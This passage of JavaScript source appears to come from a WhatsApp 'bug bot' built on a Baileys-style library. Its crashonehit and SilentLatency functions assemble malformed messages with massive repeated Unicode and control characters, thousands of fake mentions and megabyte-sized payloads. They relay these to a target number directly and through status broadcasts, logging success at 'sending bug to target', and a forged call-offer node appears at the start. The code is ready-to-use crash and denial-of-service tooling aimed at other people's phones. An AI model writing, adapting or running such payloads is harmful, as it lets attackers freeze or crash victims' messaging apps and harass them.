    ...(shouldIncludeDeviceIdentity ? [{
      tag: "device-identity",
      attrs: {},
      content: encodeSignedDeviceIdentity(
        sock.authState.creds.account,
        true
      )
    }] : [])
  ]

  if (isVideo) {
    offerContent.splice(2, 0, {
      tag: "video",
      attrs: {
        orientation: "0",
        screen_width: "99999",
        screen_height: "99999",
        device_orientation: "0",
        enc: "vp8",
        dec: "vp8"
      }
    })
  }

  const callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
        "call-creator": sock.user.id
      },
      content: offerContent
    }]
  }

  await sock.sendNode(callNode)

  // restore original (important)
  sock.createParticipantNodes = originalCreateParticipantNodes
}


//crashonehit
async function crashonehit(sock, target) {
  const NanMsg = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: target, 
      expiryTimestamp: Date.now() + 8000, 
      amount: 5,
      contextInfo: {
        externalAdReply: {
          title: "\u0000".repeat(500) +
                 "@".repeat(3000) +
                 "\u200D".repeat(500) + 
                 "ꦾ".repeat(2100) +
                 "\u202E".repeat(20) + 
                 "ꦽ".repeat(2000) +
                 "[[[{".repeat(100) + 
                 "X".repeat(5000),
          
          body: "\u0000".repeat(999), 
          mimetype: 'audio/mpeg',
          caption: "ꦾ".repeat(5000) + "@".repeat(1000), 
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null,
          
          contextInfo: {
            mentionedJid: Array(100).fill(target),
            forwardingScore: 999999,
            isForwarded: true,
            externalAdReply: {
              title: "vxz: " + "@".repeat(2900),
              contextInfo: {
                mentionedJid: Array(50).fill(target)
              }
            }
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, NanMsg, {
      participant: { jid: target },
      messageId: null,
      userJid: target, 
      quoted: null
    });
    console.log(chalk.red("⚠ SYED BUG BOT Succesfully sending bug to target"));
  } catch (error) {
    console.log(chalk.red("❌ eror jir: ", error.message));
  }
}



async function SilentLatency(sock, target) {  
  const warx = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", warx, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const warx2 = {
     viewOnceMessage: {
         message: {
             interactiveResponseMessage: {
                 body: {
                    text: "What Do You Mean.",
                    format: "DEFAULT"
                 },
                 nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(1045000),
                    version: 3
                 },
                entryPointConversionSource: "galaxy_message",
             }
         }
     },
     ephemeralExpiration: 0,
     forwardingScore: 9741,
     isForwarded: true,
     font: Math.floor(Math.random() * 99999999),
     background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
};
 
   await sock.relayMessage("status@broadcast", warx2, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
  
   const warx3 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const ara = generateWAMessageFromContent(target, warx3, {});
      await sock.relayMessage("status@broadcast", ara.message, {
        messageId: ara.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
  const jablayberdasi = Array.from({ length: 30000 }, (_, r) => ({
     title: "ꦾ".repeat(90000) + "ꦽ".repeat(90000) + "\u0003".repeat(9000),
     rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));
  
  const msg = {
   viewOnceMessage: {
       message: {
           listResponseMessage: {
              title: "Fuck You",
              listType: 2,
              buttonText: null,
              sections: jablayberdasi,
              singleSelectReply: { selectedRowId: "xnxxx" },
                contextInfo: {
                  mentionedJid: Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "5521992999999@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Whats Your"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }     
    };
        
    await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });
  
  const dlay2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { 
                            text: "⟅༑", 
                            format: "DEFAULT" 
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        const button2 = await generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "Xnxxx" + "𑆿𑆴𑆿".repeat(6000)
                },
                nativeFlowResponseMessage: {
                    name: "button_reply",
                    paramsJson: JSON.stringify({ id: "option_a" })
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        await sock.relayMessage("status@broadcast", dlay2.message, {
            messageId: dlay2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });

        await sock.relayMessage("status@broadcast", dlay2.message, {
            messageId: dlay2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
        
       console.log(`Succes Send Delay Invisible ${target}`);
    }
        
      

// Initialize premium users and owners and WhatsApp connections on startup

initializeWhatsAppConnections();

console.log(chalk.red('SYED BUG BOTBugBot V2 is running! 🚀'));